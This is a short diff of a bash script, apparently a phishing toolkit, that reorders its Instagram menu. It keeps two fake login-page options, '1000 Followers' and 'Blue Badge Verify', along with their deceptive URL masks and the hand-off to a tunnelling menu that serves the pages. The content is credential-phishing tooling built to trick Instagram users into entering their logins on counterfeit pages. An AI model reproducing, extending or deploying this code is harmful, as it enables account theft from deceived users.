@@ -377,10 +377,8 @@ site_facebook() {
 site_instagram() {
 	cat <<- EOF
 
-		${RED}[${WHITE}01${RED}]${CYAN} Traditional Login Page
-		${RED}[${WHITE}02${RED}]${CYAN} Auto Followers Login Page
-		${RED}[${WHITE}03${RED}]${CYAN} 1000 Followers Login Page
-		${RED}[${WHITE}04${RED}]${CYAN} Blue Badge Verify Login Page
+		${RED}[${WHITE}01${RED}]${CYAN} 1000 Followers Login Page
+		${RED}[${WHITE}02${RED}]${CYAN} Blue Badge Verify Login Page
 
 	EOF
 
@@ -388,18 +386,10 @@ site_instagram() {
 
 	case $REPLY in 
 		1 | 01)
-			website="instagram"
-			mask='http://get-unlimited-followers-for-instagram'
-			tunnel_menu;;
-		2 | 02)
-			website="ig_followers"
-			mask='http://get-unlimited-followers-for-instagram'
-			tunnel_menu;;
-		3 | 03)
 			website="insta_followers"
 			mask='http://get-1000-followers-for-instagram'
 			tunnel_menu;;
-		4 | 04)
+		2 | 02)
 			website="ig_verify"
 			mask='http://blue-badge-verify-for-instagram-free'
 			tunnel_menu;;
